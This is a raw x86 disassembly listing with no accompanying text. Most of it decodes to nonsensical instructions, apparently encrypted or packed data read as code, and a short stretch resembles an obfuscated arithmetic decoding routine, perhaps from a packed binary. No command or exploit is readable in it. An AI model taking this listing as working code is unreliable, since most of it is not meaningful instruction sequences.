  41a445:	inc    ebp
  41a446:	ins    BYTE PTR es:[edi],dx
  41a447:	cmp    DWORD PTR [eax-0x22],esi
  41a44a:	inc    edi
  41a44b:	adc    DWORD PTR [eax],ebx
  41a44d:	push   ds
  41a44e:	sbb    al,0x3d
  41a450:	mov    edx,0x682d1e19
  41a455:	xor    DWORD PTR ds:0xa3c57345,ebp
  41a45b:	das    
  41a45c:	repz ret 0xdac6
  41a460:	rep lods eax,DWORD PTR ds:[esi]
  41a462:	and    ebp,DWORD PTR [edx+eax*1-0x5f60e0c9]
  41a469:	cmp    BYTE PTR [ecx],cl
  41a46b:	cmp    BYTE PTR [edx-0x6c7d5e0f],bh
  41a471:	and    esp,DWORD PTR [ebp+0x565d3678]
  41a477:	out    dx,eax
  41a478:	push   edi
  41a479:	and    DWORD PTR [edi],edi
  41a47b:	mov    ah,0x4a
  41a47d:	out    dx,al
  41a47e:	sub    DWORD PTR [edi+0x26],ebp
  41a481:	test   cl,ah
  41a483:	es ja  0x41a449
  41a486:	scas   al,BYTE PTR es:[edi]
  41a487:	mov    ds:0xddcd2ae6,eax
  41a48c:	dec    ebx
  41a48d:	pop    eax
  41a48e:	pop    edi
  41a48f:	sub    al,0x1
  41a491:	(bad)  
  41a492:	scas   al,BYTE PTR es:[edi]
  41a493:	(bad)  
  41a494:	push   esp
  41a495:	test   BYTE PTR [eax-0x2a],bl
  41a498:	cmp    eax,0x1be1a603
  41a49d:	sbb    al,al
  41a49f:	scas   eax,DWORD PTR es:[edi]
  41a4a0:	ins    BYTE PTR es:[edi],dx
  41a4a1:	push   esp
  41a4a2:	fnstsw WORD PTR [edx+0x348370cd]
  41a4a8:	dec    ebp
  41a4a9:	lds    ebp,FWORD PTR [esi-0x77712eaa]
  41a4af:	cs dec eax
  41a4b1:	adc    ch,dl
  41a4b3:	jecxz  0x41a48a
  41a4b5:	dec    esp
  41a4b6:	scas   eax,DWORD PTR es:[edi]
  41a4b7:	inc    edx
  41a4b8:	ja     0x41a51b
  41a4ba:	das    
  41a4bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4bc:	dec    edx
  41a4bd:	test   DWORD PTR [edi],ecx
  41a4bf:	pop    ss
  41a4c0:	mov    ecx,0xa47bfae8
  41a4c5:	sub    edi,edi
  41a4c7:	sbb    bl,ah
  41a4c9:	cmp    DWORD PTR [edi-0x173abe32],edi
  41a4cf:	out    dx,al
  41a4d0:	mov    edx,0x7ea161d1
  41a4d5:	push   ax
  41a4d7:	outs   dx,BYTE PTR ds:[esi]
  41a4d8:	mov    edi,0x213571a1
  41a4dd:	clc    
  41a4de:	dec    ebp
  41a4df:	cwde   
  41a4e0:	adc    dh,cl
  41a4e2:	mov    cl,0x81
  41a4e4:	inc    edi
  41a4e5:	sub    eax,0x58aee2c9
  41a4ea:	jmp    0xa8e5:0x1023aa2
  41a4f1:	dec    ecx
  41a4f2:	retf   0xbd0e
  41a4f5:	xchg   edx,eax
  41a4f6:	scas   eax,DWORD PTR es:[edi]
  41a4f7:	sbb    cl,BYTE PTR [ecx+0x64ace8a]
  41a4fd:	into   
  41a4fe:	sar    DWORD PTR [ebx-0x14],1
  41a501:	or     BYTE PTR [edi],bl
  41a503:	mov    eax,ds:0x6d14b23c
  41a509:	dec    esp
  41a50a:	push   ecx
  41a50b:	fs and eax,0xe5c8ebae
  41a511:	dec    ebp
  41a512:	fild   WORD PTR [ebp-0x34]
  41a515:	mov    dh,0xc3
  41a517:	repnz adc eax,DWORD PTR [edi-0x46]
  41a51b:	add    ch,dl
  41a51d:	pop    esi
  41a51e:	pop    edx
  41a51f:	std    
  41a520:	add    BYTE PTR [edi+0x3ae60993],dh
  41a526:	jae    0x41a525
  41a528:	sahf   
  41a529:	jg     0x41a4ed
  41a52b:	lahf   
  41a52c:	ins    BYTE PTR es:[edi],dx
  41a52d:	mov    eax,0x80a84448
  41a532:	mov    bh,0x65
  41a534:	into   
  41a535:	push   DWORD PTR [ecx-0x4544916b]
  41a53b:	sub    al,0x2c
  41a53d:	inc    esi
  41a53e:	lods   eax,DWORD PTR ds:[esi]
  41a53f:	out    0x73,al
  41a541:	mov    DWORD PTR [esi-0x337ae3d0],edx
  41a547:	inc    ebx
  41a548:	push   edi
  41a549:	shl    ebx,0x82
  41a54c:	mov    ah,0xfd
  41a54e:	popf   
  41a54f:	push   0x60
  41a551:	add    al,0x15
  41a553:	scas   eax,DWORD PTR es:[edi]
  41a554:	cmp    BYTE PTR fs:[ecx],al
  41a557:	repz cmp eax,0x974c38cf
  41a55d:	fdivr  QWORD PTR [eax-0x37]
  41a560:	push   eax
  41a561:	jno    0x41a56f
  41a563:	mov    esi,0xeea2542b
  41a568:	data16 adc cl,BYTE PTR [esi+0x2072ae26]
  41a56f:	stos   BYTE PTR es:[edi],al
  41a570:	in     eax,dx
  41a571:	inc    ecx
  41a572:	add    dh,0x45
  41a575:	mov    al,0x37
  41a577:	mov    edi,0x7664d5ce
  41a57c:	imul   ax,ax,0xf72f
  41a581:	data16 jne 0x41a5e2
  41a584:	call   0xe660:0xcece2069
  41a58b:	adc    BYTE PTR [esi+0x71de2f27],dh
  41a591:	push   esi
  41a592:	fisub  DWORD PTR [edi-0x9]
  41a595:	adc    ecx,esi
  41a597:	fimul  DWORD PTR [esi]
  41a599:	lea    esi,ds:0xc7ab971f
  41a59f:	mov    bh,0x55
  41a5a1:	popa   
  41a5a2:	sbb    BYTE PTR [eax-0x78e032d8],0x31
  41a5a9:	xor    ebx,DWORD PTR [ecx-0x2e8dc2cd]
  41a5af:	rcl    BYTE PTR [ecx-0x32],0x62
  41a5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5b4:	cmp    BYTE PTR [edx+esi*4],bl
  41a5b7:	inc    eax
  41a5b8:	push   ebx
  41a5b9:	sub    al,al
  41a5bb:	shl    BYTE PTR [edi+0x3eab9893],1
  41a5c1:	jbe    0x41a60b
  41a5c3:	fisttp QWORD PTR [edx-0x47e8e320]
  41a5c9:	in     al,0x26
  41a5cb:	jno    0x41a606
  41a5cd:	jb     0x41a55d
  41a5cf:	adc    eax,0x38e39138
  41a5d4:	adc    al,0x23
  41a5d6:	mov    al,ds:0x1d07dd72
  41a5db:	cvttps2pi mm1,xmm1
  41a5de:	call   0xef4f2048
  41a5e3:	or     ecx,esi
  41a5e5:	jbe    0x41a5d2
  41a5e7:	(bad)  
  41a5e8:	mov    BYTE PTR ds:0x4fedcb4,bh
  41a5ee:	pop    ss
  41a5ef:	mov    ah,BYTE PTR [eax+0x4d6d2e85]
  41a5f5:	(bad)  
  41a5f6:	retf   
  41a5f7:	ret    0x9049
  41a5fa:	jb     0x41a661
  41a5fc:	sub    BYTE PTR [eax+0x59b4a788],cl
  41a602:	rcr    BYTE PTR [ebx],1
  41a604:	inc    eax
  41a605:	(bad)  
  41a607:	or     al,0xe5
  41a609:	mov    edi,0x7802caf9
  41a60e:	leave  
  41a60f:	add    ebp,edx
  41a611:	shl    DWORD PTR [ecx-0x1a],cl
  41a614:	sub    ch,BYTE PTR [ebp+0x72]
  41a617:	test   DWORD PTR [ebx],ebp
  41a619:	call   0x27c546ec
  41a61e:	(bad)  
  41a61f:	lods   al,BYTE PTR ds:[esi]
  41a620:	mov    ds:0x3e6a469e,al
  41a625:	dec    edi
  41a626:	int3   
  41a627:	cmp    bl,dl
  41a629:	cmp    bl,BYTE PTR [ebp-0x76]
  41a62c:	dec    edi
  41a62d:	enter  0x5c3f,0x24
  41a631:	pop    eax
  41a632:	ins    DWORD PTR es:[edi],dx
  41a633:	iret   
  41a634:	repnz outs dx,BYTE PTR ds:[esi]
  41a636:	mov    ch,0x39
  41a638:	out    0x3c,eax
  41a63a:	mov    esi,ecx
  41a63c:	mov    ebx,ebx
  41a63e:	mov    DWORD PTR [edi+ebp*2+0x72684f52],esi
  41a645:	jg     0x41a666
  41a647:	and    DWORD PTR [eax],esp
  41a649:	fcmovb st,st(1)
  41a64b:	test   DWORD PTR [esi+0x45],ecx
  41a64e:	das    
  41a64f:	(bad)  
  41a650:	mov    eax,ds:0x7e3b5c1f
  41a655:	aas    
  41a656:	neg    BYTE PTR [ebp+edx*2-0x1a21c7fd]
  41a65d:	mov    ds:0xb8fcec5,eax
  41a662:	mov    al,ds:0x52cf2a70
  41a667:	mov    ecx,DWORD PTR [ecx-0x65c8dbfc]
  41a66d:	and    eax,0x6823f1f0
  41a672:	add    eax,0xfaf84e6b
  41a677:	sub    BYTE PTR [edx+0x4af11dfb],0x19
  41a67e:	ins    BYTE PTR es:[edi],dx
  41a67f:	push   cs
  41a680:	xchg   edi,eax
  41a681:	jle    0x41a665
  41a683:	mov    ds:0x260cd07d,al
  41a688:	mov    ah,BYTE PTR [edi-0x4e]
  41a68b:	cmp    ebp,esi
  41a68d:	inc    esp
  41a68e:	jne    0x41a66b
  41a690:	dec    edi
  41a691:	test   BYTE PTR [ebp-0x17],dh
  41a694:	(bad)  [esi-0x6e]
  41a697:	cld    
  41a698:	or     eax,ebp
  41a69a:	add    BYTE PTR [edx+0x23],ch
  41a69d:	cmp    bl,dl
  41a69f:	sub    al,0x35
  41a6a1:	loopne 0x41a6c2
  41a6a3:	dec    ebp
  41a6a4:	mov    eax,0x8eae8f3e
  41a6a9:	pop    eax
  41a6aa:	(bad)  
  41a6ab:	and    eax,0xe25f87f9
  41a6b0:	fild   DWORD PTR [ebp-0xc]
  41a6b3:	mov    BYTE PTR [ecx-0x5edc4173],bh
  41a6b9:	daa    
  41a6ba:	loopne 0x41a6e4
  41a6bc:	jmp    0xb45e:0x1f8e9f97
  41a6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6c4:	jae    0x41a6ad
  41a6c6:	js     0x41a687
  41a6c8:	adc    ah,BYTE PTR [eax+0x50c58c72]
  41a6ce:	inc    esi
  41a6cf:	shl    bl,0xa5
  41a6d2:	in     eax,0x5a
  41a6d4:	stos   DWORD PTR es:[edi],eax
  41a6d5:	sub    eax,0xf409f947
  41a6da:	mov    ebx,0x3d2c597f
  41a6df:	fs push ebx
  41a6e1:	sti    
  41a6e2:	xchg   DWORD PTR [ecx],ebx
  41a6e4:	adc    esp,DWORD PTR [edx]
  41a6e6:	sub    DWORD PTR [edi+eiz*4-0x24],esp
  41a6ea:	sub    BYTE PTR [ebx-0x64],bh
  41a6ed:	push   ds
  41a6ee:	inc    edi
  41a6ef:	ins    DWORD PTR es:[edi],dx
  41a6f0:	cld    
  41a6f1:	test   bl,al
  41a6f3:	jg     0x41a71a
  41a6f5:	fdiv   QWORD PTR [edx-0x313c26e3]
  41a6fb:	int3   
  41a6fc:	sbb    al,0x21
  41a6fe:	xchg   ebx,eax
  41a6ff:	dec    edx
  41a700:	inc    eax
  41a701:	sbb    ebp,esp
  41a703:	dec    si
  41a705:	outs   dx,DWORD PTR ds:[esi]
  41a706:	pop    edi
  41a707:	sub    DWORD PTR [ebx+0x3fa0c8be],esi
  41a70d:	xchg   esp,eax
  41a70e:	push   es
  41a70f:	inc    bh
  41a711:	fisubr WORD PTR [ebx-0x2aa471cd]
  41a717:	imul   eax,DWORD PTR [edi+esi*4],0x1d
  41a71b:	dec    esi
  41a71c:	es or  al,0xbc
  41a71f:	and    ebp,DWORD PTR ds:0xbe4dbfac
  41a725:	xchg   edi,eax
  41a726:	pushw  cs
  41a728:	dec    ebp
  41a729:	imul   eax,DWORD PTR [ebx+0xc8e942e],0x64
  41a730:	push   cs
  41a731:	mov    cl,0x61
  41a733:	sbb    DWORD PTR [edi],ebx
  41a735:	leave  
  41a736:	cmp    BYTE PTR [ebx-0x744ee989],dh
  41a73c:	inc    ebx
  41a73d:	into   
  41a73e:	(bad)  
  41a73f:	push   ecx
  41a740:	aad    0xf9
  41a742:	adc    BYTE PTR [esi+0x747bebba],ch
  41a748:	outs   dx,BYTE PTR ds:[esi]
  41a749:	or     BYTE PTR [ebx+0x7d],0x11
  41a74d:	and    al,0xcf
  41a74f:	xlat   BYTE PTR ds:[ebx]
  41a750:	leave  
  41a751:	test   DWORD PTR [ecx+0x4ab21abd],edx
  41a757:	ins    BYTE PTR es:[edi],dx
  41a758:	dec    ebx
  41a759:	mov    ds,WORD PTR ds:0x47a3b7a1
  41a75f:	adc    DWORD PTR [eax*8-0x36c75160],0x4a
  41a767:	mov    ch,0xfe
  41a769:	ret    0xc8
  41a76c:	or     bh,ah
  41a76e:	dec    ebx
  41a76f:	mul    BYTE PTR [ebp+0x52]
  41a772:	and    eax,0xd376610
  41a777:	cmc    
  41a778:	cli    
  41a779:	and    BYTE PTR [ebp+0x2b],dl
  41a77c:	scas   al,BYTE PTR es:[edi]
  41a77d:	jbe    0x41a792
  41a77f:	push   ebx
  41a780:	jmp    0x2570:0xe8298e6b
  41a787:	rcl    BYTE PTR [eax+ebx*4-0x6cbce90c],0x3f
  41a78f:	jne    0x41a7ca
  41a791:	pop    ecx
  41a792:	mov    edx,0x61360c1d
  41a797:	dec    ebx
  41a798:	icebp  
  41a799:	fwait
  41a79a:	mov    WORD PTR [ecx-0x31a6ca97],ds
  41a7a0:	std    
  41a7a1:	or     DWORD PTR [ecx-0x2d],ebx
  41a7a4:	sbb    eax,0x8d8a5b6b
  41a7a9:	sbb    BYTE PTR [ecx],cl
  41a7ab:	mov    ds:0xee465717,al
  41a7b0:	sub    WORD PTR [ebx],di
  41a7b3:	loopne 0x41a7ac
  41a7b5:	xor    ah,BYTE PTR [eax+0x25d721e4]
  41a7bb:	(bad)  [esi+edi*8+0x10]
  41a7bf:	dec    esp
  41a7c0:	jg     0x41a79c
  41a7c2:	inc    esp
  41a7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x5f9a47d2]
  41a82d:	xchg   esi,eax
  41a82e:	nop
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	push   0x70
  41a838:	push   ss
  41a839:	outs   dx,WORD PTR ds:[esi]
  41a83b:	or     edi,eax
  41a83d:	jge    0x41a831
  41a83f:	ins    BYTE PTR es:[edi],dx
  41a840:	outs   dx,BYTE PTR fs:[esi]
  41a842:	push   ecx
  41a843:	clc    
  41a844:	add    eax,0x1fdf66a7
  41a849:	sbb    eax,0x57cee77e
  41a84e:	push   ss
  41a84f:	imul   esp,esp,0x53
  41a852:	int3   
  41a853:	mov    ebx,0xe982bd23
  41a858:	out    dx,al
  41a859:	in     al,0x51
  41a85b:	cmp    edx,DWORD PTR es:[ebx]
  41a85e:	add    ah,dl
  41a860:	jmp    0x41a858
  41a862:	icebp  
  41a863:	enter  0xb5b5,0x72
  41a867:	adc    BYTE PTR [ebp-0x565dadc1],bh
  41a86d:	aad    0x27
  41a86f:	fdivp  st(3),st
  41a871:	bound  ecx,QWORD PTR [ebp-0x4fc933bb]
  41a877:	cmp    esp,DWORD PTR [edi-0x35e552b4]
  41a87d:	scas   eax,DWORD PTR es:[edi]
  41a87e:	sbb    DWORD PTR [edx-0x5c821946],ecx
  41a884:	pushf  
  41a885:	xor    ebp,ebp
  41a887:	dec    ecx
  41a888:	mov    eax,0xd6465c5
  41a88d:	push   0x4141f662
  41a892:	enter  0xc250,0x1b
  41a896:	and    al,0x3f
  41a898:	stos   BYTE PTR es:[edi],al
  41a899:	jae    0x41a85d
  41a89b:	push   0xffffffd6
  41a89d:	xchg   ebx,eax
  41a89e:	xor    eax,0x7c1be8a
  41a8a3:	lock sti 
  41a8a5:	test   eax,ecx
  41a8a7:	pop    ebp
  41a8a8:	pushf  
  41a8a9:	push   ss
  41a8aa:	stos   BYTE PTR es:[edi],al
  41a8ab:	not    DWORD PTR [esp+edx*1+0x54b2122c]
  41a8b2:	jne    0x41a8e6
  41a8b4:	and    ebx,DWORD PTR [esi]
  41a8b6:	jle    0x41a854
  41a8b8:	mov    esi,0x23fd332b
  41a8bd:	adc    dl,BYTE PTR [ebx-0x2e]
  41a8c0:	clc    
  41a8c1:	mov    ds:0xeccbb340,eax
  41a8c6:	pop    eax
  41a8c7:	dec    esi
  41a8c8:	or     al,0x75
  41a8ca:	es adc esi,eax
  41a8cd:	mov    ds:0x63e22475,eax
  41a8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8d3:	pop    esi
  41a8d4:	push   ss
  41a8d5:	pop    ss
  41a8d6:	inc    eax
  41a8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8d8:	int    0x11
  41a8da:	mov    edi,0x90f184e0
  41a8df:	inc    eax
  41a8e0:	sbb    al,0x9
  41a8e2:	sub    cl,bh
  41a8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e5:	stc    
  41a8e6:	xchg   esp,eax
  41a8e7:	xchg   ebx,eax
  41a8e8:	sbb    BYTE PTR [ebx-0x58153dee],ah
  41a8ee:	xchg   BYTE PTR [eax-0x77],dl
  41a8f1:	sar    BYTE PTR ds:0x84e147dd,cl
  41a8f7:	push   0x53
  41a8f9:	jae    0x41a94c
  41a8fb:	fcom   DWORD PTR [ebx+ebx*1+0x73]
  41a8ff:	sbb    DWORD PTR [edx-0x7492cc7],edx
  41a905:	mov    BYTE PTR [ebx+0x3e436bf5],ah
  41a90b:	pop    eax
  41a90c:	(bad)  
  41a90d:	loopne 0x41a91d
  41a90f:	mov    al,ds:0x71281d35
  41a914:	stos   BYTE PTR es:[edi],al
  41a915:	test   eax,0x662a77ae
  41a91a:	cwde   
  41a91b:	adc    eax,ebp
  41a91d:	add    bh,cl
  41a91f:	(bad)  
  41a920:	fistp  WORD PTR ds:0x67b523d4
  41a926:	pop    ecx
  41a927:	je     0x41a986
  41a929:	imul   edi,DWORD PTR [ebx],0x32
  41a92c:	(bad)  
  41a92d:	mov    esi,DWORD PTR [eax]
  41a92f:	imul   ebx,ebp,0x66ec848e
  41a935:	mov    edi,ebp
  41a937:	pop    ss
  41a938:	fiadd  WORD PTR [eax+0x2b30a8aa]
  41a93e:	xchg   ebx,eax
  41a93f:	jo     0x41a948
  41a941:	int    0xed
  41a943:	lods   eax,DWORD PTR ds:[esi]
  41a944:	and    esp,0xffffffe9
  41a947:	mov    fs,WORD PTR [eax+0x39]
  41a94a:	popf   
  41a94b:	or     cl,BYTE PTR [edx-0x108a6e6]
  41a951:	(bad)  
  41a952:	sub    al,BYTE PTR [edx+ecx*4-0x328ff637]
  41a959:	push   0xac09bd99
  41a95e:	fwait
  41a95f:	loop   0x41a93c
  41a961:	sbb    al,0x2d
  41a963:	shr    esi,1
  41a965:	xchg   esp,eax
  41a966:	xor    BYTE PTR [edi+0xdb826bb],dl
  41a96c:	cmc    
  41a96d:	jmp    edi
  41a96f:	nop
  41a970:	daa    
  41a971:	or     ebx,DWORD PTR [edx]
  41a973:	pop    edi
  41a974:	out    0x93,al
  41a976:	mov    ds:0x5b19a41,eax
  41a97b:	and    ebx,DWORD PTR [eax]
  41a97d:	loopne 0x41a9e5
  41a97f:	mov    ebx,0xf9989d67
  41a984:	fwait
  41a985:	lea    esp,[ebx+0x1b]
  41a988:	inc    ecx
  41a989:	pop    fs
  41a98b:	jle    0x41a9f0
  41a98d:	add    ebx,esi
  41a98f:	outs   dx,BYTE PTR ds:[esi]
  41a990:	sbb    esp,DWORD PTR [eax+0xbdf3e8d]
  41a996:	test   al,0xe1
  41a998:	push   0x4b
  41a99a:	add    eax,0xef9fe562
  41a99f:	push   0xffffffed
  41a9a1:	dec    esi
  41a9a3:	xchg   BYTE PTR [ecx+0x6b],bh
  41a9a6:	es dec eax
  41a9a8:	clc    
  41a9a9:	in     eax,dx
  41a9aa:	jnp    0x41aa0c
  41a9ac:	dec    ecx
  41a9ad:	int3   
  41a9ae:	xlat   BYTE PTR ds:[ebx]
  41a9af:	mov    DWORD PTR [ebp-0x3549e2fd],esp
  41a9b5:	lods   eax,DWORD PTR ds:[esi]
  41a9b6:	cli    
  41a9b7:	push   es
  41a9b8:	int3   
  41a9b9:	sbb    eax,0x6a1b207
  41a9be:	cli    
  41a9bf:	pop    ecx
  41a9c0:	test   eax,0x1d4912d9
  41a9c5:	adc    bl,BYTE PTR [ecx+0x600b920c]
  41a9cb:	push   ss
  41a9cc:	jecxz  0x41a99f
  41a9ce:	cmp    ah,bh
  41a9d0:	retf   0xcf2b
  41a9d3:	push   esp
  41a9d4:	enter  0x2603,0xb2
  41a9d8:	pop    edx
  41a9d9:	dec    esp
  41a9da:	mov    ds:0x4741acac,al
  41a9df:	addr16 push edx
  41a9e1:	mov    gs,WORD PTR [ebx]
  41a9e3:	pop    edx
  41a9e4:	or     ebp,DWORD PTR [ecx+0x7a]
  41a9e7:	gs push ecx
  41a9e9:	test   al,0xf7
  41a9eb:	adc    DWORD PTR [ecx-0x47],edx
  41a9ee:	(bad)  
  41a9ef:	pop    eax
  41a9f0:	ja     0x41a9f1
  41a9f2:	jecxz  0x41aa48
  41a9f4:	adc    eax,DWORD PTR [ebp-0x3e]
  41a9f7:	ja     0x41a99c
  41a9f9:	pop    ebp
  41a9fa:	mov    ch,BYTE PTR ds:0x4efe6c65
  41aa00:	sub    eax,DWORD PTR [esp+ecx*2-0x2293d31d]
  41aa07:	ror    DWORD PTR [ebp-0x73802d22],1
  41aa0d:	push   ss
  41aa0e:	cmp    edi,DWORD PTR [ebx-0x2d]
  41aa11:	das    
  41aa12:	imul   ecx,DWORD PTR [ecx-0x48],0x22
  41aa16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa17:	data16 sti 
  41aa19:	add    esi,DWORD PTR [esi]
  41aa1b:	mov    eax,0x3ea3358c
  41aa20:	mov    ch,0xec
  41aa22:	xchg   esp,eax
  41aa23:	(bad)  [edx]
  41aa25:	mov    ds:0xef6d9754,eax
  41aa2a:	xor    al,0x24
  41aa2c:	mov    edx,0xda07e012
  41aa31:	in     al,0x11
  41aa33:	pop    edx
  41aa34:	imul   edx,DWORD PTR [ecx],0x2d
  41aa37:	retf   0x4c45
  41aa3a:	pop    ebx
  41aa3b:	gs pop edx
  41aa3d:	inc    ecx
  41aa3e:	mov    bl,0xa1
  41aa40:	xchg   esp,eax
  41aa41:	mov    BYTE PTR [eax],dl
  41aa43:	aad    0xa5
  41aa45:	ret    
  41aa46:	mov    esp,0x9f61c96c
  41aa4b:	cmp    eax,0x128eef7e
  41aa50:	jo     0x41aa38
  41aa52:	repnz push eax
  41aa55:	enter  0xd3a4,0x3d
  41aa59:	push   0x98b7cd96
  41aa5e:	sbb    dl,BYTE PTR [eax]
  41aa60:	inc    esp
  41aa61:	sub    al,0x74
  41aa63:	sbb    al,0x3e
  41aa65:	mov    bl,dl
  41aa67:	(bad)  
  41aa68:	ins    BYTE PTR es:[edi],dx
  41aa69:	or     eax,0x56da6e33
  41aa6e:	pop    esi
  41aa6f:	mov    al,ds:0x6f7e6dc8
  41aa74:	xor    edi,eax
  41aa76:	pop    edx
  41aa77:	mov    ch,0xc2
  41aa79:	mov    dl,0x6d
  41aa7b:	add    al,0xda
  41aa7d:	ins    DWORD PTR es:[edi],dx
  41aa7e:	ror    BYTE PTR [ecx-0x6a0971e2],1
  41aa84:	dec    ebx
  41aa85:	cwde   
  41aa86:	stc    
  41aa87:	or     BYTE PTR [eax-0x5e5b1dc4],0xed
  41aa8e:	jno    0x41aabe
  41aa90:	mov    gs,WORD PTR [eax]
  41aa92:	pop    fs
  41aa94:	xchg   ebx,eax
  41aa95:	ins    DWORD PTR es:[edi],dx
  41aa96:	mov    al,0x8f
  41aa98:	dec    ecx
  41aa99:	cmp    DWORD PTR [eax],0xffffffb2
  41aa9c:	aaa    
  41aa9d:	dec    eax
  41aa9e:	xchg   ebx,eax
  41aa9f:	jp     0x41aac0
  41aaa1:	and    al,0x25
  41aaa3:	outs   dx,DWORD PTR ds:[esi]
  41aaa4:	pop    esp
  41aaa5:	jg     0x41aa83
  41aaa7:	cmp    eax,0xa550663c
  41aaac:	xor    cl,BYTE PTR [ebx]
  41aaae:	cli    
  41aaaf:	icebp  
  41aab0:	xchg   ebx,eax
  41aab1:	push   0x5b1e439a
  41aab6:	inc    ecx
  41aab7:	adc    al,al
  41aab9:	out    dx,eax
  41aaba:	pop    edx
  41aabb:	mov    bl,0x1c
  41aabd:	add    eax,DWORD PTR [edi]
  41aabf:	add    bl,BYTE PTR [edx+ebx*1]
  41aac2:	mov    ebx,0x6e268a4e
  41aac7:	and    BYTE PTR [edi+0x12b90468],dl
  41aacd:	jne    0x41aa52
  41aacf:	cmp    ah,bh
  41aad1:	jmp    0x86641b25
  41aad6:	(bad)  
  41aad7:	shl    BYTE PTR [ebx-0x53],0x8e
  41aadb:	jae    0x41aab1
  41aadd:	push   ebx
  41aade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aadf:	stos   DWORD PTR es:[edi],eax
  41aae0:	ja     0x41aa87
  41aae2:	jmp    0x21529e98
  41aae7:	mov    ebx,0x4a89a934
  41aaec:	cmp    ecx,eax
  41aaee:	or     eax,DWORD PTR [esi]
  41aaf0:	mov    esi,0x7c62a8e
  41aaf5:	xor    BYTE PTR [edx],dl
  41aaf7:	sub    eax,0xbe10e4f6
  41aafc:	jae    0x41aac9
  41aafe:	push   ds
  41aaff:	mov    edx,0xb6ef88d
  41ab04:	ins    DWORD PTR es:[edi],dx
  41ab05:	mov    BYTE PTR [ecx-0x2a417336],ah
  41ab0b:	in     al,0x46
  41ab0d:	aas    
  41ab0e:	and    DWORD PTR ds:[edx+0x7c90b6ae],esi
  41ab15:	xchg   ecx,eax
  41ab16:	icebp  
  41ab17:	xor    BYTE PTR [edi],ch
  41ab19:	int3   
  41ab1a:	fist   DWORD PTR [edi+ecx*1+0x74d1515]
  41ab21:	les    eax,FWORD PTR [edi]
  41ab23:	xchg   BYTE PTR [edx+0x3c],ch
  41ab26:	sub    ch,BYTE PTR [ecx+0x62]
  41ab29:	nop
  41ab2a:	fsub   st(0),st
  41ab2c:	imul   esi,DWORD PTR [ecx],0x432adf1e
  41ab32:	mov    al,0x61
  41ab34:	mov    ecx,0x6409c857
  41ab39:	pusha  
  41ab3a:	dec    ecx
  41ab3b:	dec    esi
  41ab3c:	in     eax,dx
  41ab3d:	jp     0x41aaf5
  41ab3f:	pop    edx
  41ab40:	dec    DWORD PTR [esi+0xcb02b8c]
  41ab46:	and    bh,BYTE PTR ds:0x48748272
  41ab4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab4d:	jle    0x41abc8
  41ab4f:	sub    ebp,edi
  41ab51:	fisttp QWORD PTR [edx]
  41ab53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab54:	add    edx,ecx
  41ab56:	std    
  41ab57:	push   ebp
  41ab58:	dec    eax
  41ab59:	subps  xmm3,XMMWORD PTR ds:0x2db635bc
  41ab60:	lahf   
  41ab61:	cmc    
  41ab62:	xor    BYTE PTR [esi-0x50928fea],0x8d
  41ab69:	std    
  41ab6a:	cmp    bl,BYTE PTR [eax-0x3cb753ff]
  41ab70:	fdivr  DWORD PTR [ecx-0x417e6a57]
  41ab76:	cmp    dl,dl
  41ab78:	pop    edi
  41ab79:	sub    eax,0xe5b5f94a
  41ab7e:	add    ecx,ebp
  41ab80:	fxam   
  41ab82:	repz pop ss
  41ab84:	ins    DWORD PTR es:[edi],dx
  41ab85:	sbb    esp,DWORD PTR [eax]
  41ab87:	mov    ecx,0xb2bd146
  41ab8c:	rol    BYTE PTR ds:0x930d8e1d,cl
  41ab92:	xchg   edx,eax
  41ab93:	xor    BYTE PTR [ebx],bl
  41ab95:	loope  0x41ab43
  41ab97:	dec    eax
  41ab98:	sbb    BYTE PTR [eax],bh
  41ab9a:	jp     0x41ab7f
  41ab9c:	fwait
  41ab9d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab9f:	je     0x41ab5f
  41aba1:	mov    al,0xda
  41aba3:	add    ch,BYTE PTR [ebx-0x133b1734]
  41aba9:	stos   BYTE PTR es:[edi],al
  41abaa:	xchg   ebp,eax
  41abab:	lods   al,BYTE PTR ds:[esi]
  41abac:	sbb    ebp,eax
  41abae:	and    edx,edx
  41abb0:	icebp  
